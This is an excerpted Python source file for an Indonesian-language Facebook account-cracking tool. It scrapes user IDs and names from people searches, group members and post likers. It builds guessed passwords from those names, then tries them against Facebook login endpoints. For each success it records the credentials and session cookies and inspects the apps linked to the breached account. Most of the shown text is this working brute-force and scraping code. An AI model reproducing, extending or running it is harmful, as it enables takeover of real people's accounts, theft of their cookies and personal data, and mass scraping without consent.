...
###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil
...
def tampilan_menu():
    resik()
    try:
        open('tool/useragent.json','r').read()
    except:
        resik()
        poster2()
        print('')
  ...
  {J2}[{A2}03{J2}] {P2}Nama      {J2}[{A2}08{J2}] {A2}Hashtag  {J2}[{A2}13{J2}] {A2}ID Random   
...
def pilih_menu():
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:publik();system_login();metode();addpass();crack()
    elif dc in ['2','02','b']:main_folls();system_login();metode();addpass();crack()
    ...
    elif dc in ['8','08','h']:pass
    elif dc in ['9','09','i']:pass
    elif dc in ['10','010','j']:pass
    elif dc in ['11','011','k']:pass
    elif dc in ['12','012','l']:pass
    elif dc in ['13','013','m']:pass
    elif dc in ['14','014','n']:pass
    elif dc in ['15','015','o']:pass
    elif dc in ['16','016','p']:pass
    elif dc in ['17','017','q']:pass
    elif dc in ['18','018','r']:pass
    elif dc in ['19','019','s']:
        useragent('old')
    elif dc in ['20','020','t']:pass
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
...
def useragent(isi):
    ...
    if dc in ['1','01','a']:
        ...
        pilih_otomatis()
    elif dc in ['3','03','c']:pass
    elif dc in ['4','04','d']:pass
    elif dc in ['5','05','e']:pass
...
def scrap_useragent():
    ...
    try:
        ...
        if pengguna_source_code == 'old':
            input('\n   %s[ %sKembali %s]'%(J,P,J))
            tampilan_menu()
        else:
            print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J))
            exit('\n')
    except Exception as e:
        print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P))
        exit()
...
class namee:
    def __init__(self):
        ...
        for set1 in put:
            data.append(set1)
            for set2 in common:
                data.append(set2+' '+set1)
        for set3 in data:
            url = 'https://mbasic.facebook.com/search/people/?q='+set3
    ...
    def exec(self,url,cookie):
        try:
            with requests.Session() as xyz:
                ...
                if 'Anda Diblokir Sementara' in spam.text:
                    print("\r       %s[%s•%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
                else:
                                ...
                                if 'profile.php' in str(temu["href"]):
                                    ...
                                    if len(find) !=0:
                                        ...
                                        if id in file:
                                            ...
                                            open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                ...
                for tamu in pra.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in tamu.text:
                        new_url = tamu['href']
    ...
    try: 
        ...
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:
                        scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_)
                        break
                    except Exception as e:
                        pass
    except KeyboardInterrupt:
        ...
        try:
            with requests.Session() as xyz:
                ...
                for x,y,z in re.findall('<h3><a class=\".*?\" href="(.*?)">(.*?)</a></h3><div class=\".*?\">(.*?)</div><div class=\".*?\">',str(pra)):
                    ...
                    if 'profile.php' in str(x):
                        u = str(x).split('=')[1].split('&')[0]
                    else:
                        u = str(x).split('?')[0].replace('/','')
                    try:
                ...
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        ...
                        if id not in open(self.file,'r').read():
                            ...
                            dt = self.data_grup(id,cookie)
                            if 'Grup Privat' in str(dt):
                                continue
                            elif 'Anda Diblokir Sementara' in str(dt):
                                self.looping += 1
                                print("\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                    ...
                    for po in pe.find_all('a',href=True):
                        try:
                            ...
                            if 'mbasic.facebook.com' in po['href']:pass
                                ...
                                id = re.findall('\/(.*?)\/\?refid',str(po['href']))[0]
                                nm = po.text
                                if id in fel:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:
...
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""             {J2}[{A2}1{J2}] {P2}Crack1   {J2}[{A2}2{J2}] {P2}Crack2   {J2}[{A2}3{J2}] {P2}Crack3"""
...
###----------[ URL LOGIN ]---------- ###
def metode():
    tamp_sistem = f"""             {J2}[{A2}1{J2}] {P2}FreeFB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    print('')
    if ch in ['1','01','a']:
        open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:
        open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:
...
def logger0(user,pasw): #--- Login Validate Full ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        header1 = {
        ...
        req = xyz.get("https://%s/index.php?next=https://developers.facebook.com/tools/debug/accesstoken/"%(url_login), headers=header1)
        log = {
        ...
        header2 = {
            ...
            "sec-fetch-user":"empty",
            "sec-fetch-dest":"document",
            "referer":f"https://{url_login}/index.php?next=https://developers.facebook.com/tools/debug/accesstoken/",
            "accept-encoding":"gzip, deflate br",
            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
        exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data = log, headers = header2, allow_redirects = False)
        if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
        elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
        else: return {"status":"error","email":user,"pass":pasw}
...
def cvt3(denventa):
    try:
        cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:
        cookie = 'denventagantengbanget'
    return(str(cookie))
...
def cek_aplikasi(data,cookiez):
    ...
    if len(daftar_aktif) == 1:
        dft1 = ''
    else:
        dft1 = ''.join(daftar_aktif)
    try:
    ...
    if len(daftar_inaktif) == 1:
        dft2 = ''
    else:
        dft2 = ''.join(daftar_inaktif)
    try:
        deleted = ('\n    %s[%sDihapus%s]'%(M,P,M))
    ...
    if len(daftar_dihapus) == 1:
        dft3 = ''
    else:
        dft3 = ''.join(daftar_dihapus)
...
class crack:
    def __init__(self):
        ...
        for dvt in self.open:
            try:
                self.list.append({"id":dvt.split("=")[0],"pw":password(dvt.split("=")[1])})
            except Exception as e:
                continue
    ...
    def start_crack(self,list):
        try:
            for pw in list['pw']:
                if sistem_login   == 'nol'  : log = logger0(list['id'],pw)
                elif sistem_login == 'satu' : log = logger1(list['id'],pw)
            ...
            print(f'\r   {J}[{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P}                ', end='');sys.stdout.flush()
        except Exception as e:
